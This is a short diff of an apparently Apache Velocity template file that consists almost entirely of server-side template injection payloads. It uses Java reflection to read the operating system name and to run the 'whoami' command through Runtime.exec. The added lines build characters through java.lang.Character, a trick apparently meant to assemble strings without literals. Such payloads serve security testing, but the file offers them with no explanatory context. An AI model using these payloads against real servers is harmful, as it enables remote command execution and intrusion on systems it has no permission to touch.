@@ -1,8 +1,8 @@
 #set($e="e")
 $e.getClass().forName('java.lang.System').getMethod('getProperty', $e.getClass().forName('java.lang.String')).invoke(null, 'os.name').toString()
 $e.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('whoami')
-<html>
-<body>
-e
-</body>
-</html>
+#set ($string = " ")
+#set ($asciiValue = 65)
+#set ($chars = $e.getClass().forName('java.lang.Character').toChars($asciiValue))
+#set ($letter = $string.copyValueOf($chars)) 
+$letter
